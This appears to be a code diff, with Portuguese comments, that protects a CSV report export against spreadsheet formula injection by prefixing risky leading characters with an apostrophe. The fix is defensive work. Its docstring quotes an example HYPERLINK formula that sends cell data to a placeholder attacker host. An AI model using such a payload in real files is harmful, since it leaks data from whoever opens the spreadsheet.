@@ -31,8 +31,27 @@ def csv_line(values: Sequence[str | int | None]) -> str:
     return buffer.getvalue()
 
 
+# Caracteres que fazem o Excel/LibreOffice tratar a celula como formula em vez de
+# texto. O tab e o CR entram porque o Excel os consome como separador e reavalia o
+# que vem depois.
+_INICIO_DE_FORMULA = ("=", "+", "-", "@", "\t", "\r")
+
+
 def _text(value: str | None) -> str:
-    return value if value is not None else ""
+    """Texto livre de cadastro, neutralizado contra formula injection.
+
+    O export sai com BOM UTF-8 porque o destino e abrir no Excel, e todo campo
+    aqui vem de cadastro do tenant (nome de cliente, de produto, codigo de
+    pedido) validado so por tamanho. Um nome como
+    `=HYPERLINK("http://atacante/x?d="&A1;"clique")` executaria na maquina de
+    quem abre o relatorio. O apostrofo inicial e a neutralizacao padrao: o Excel
+    exibe o conteudo como texto e nao mostra o apostrofo na celula.
+    """
+    if value is None:
+        return ""
+    if value.startswith(_INICIO_DE_FORMULA):
+        return f"'{value}"
+    return value
 
 
 def export_row_values(row: ReportExportRow) -> list[str | int | None]:
@@ -45,8 +64,8 @@ def export_row_values(row: ReportExportRow) -> list[str | int | None]:
         _text(row.customer_document),
         _text(row.customer_phone),
         _text(row.customer_email),
-        row.products,
-        row.defects,
+        _text(row.products),
+        _text(row.defects),
         _text(row.solution),
         _text(row.channel),
         _text(row.attendant),
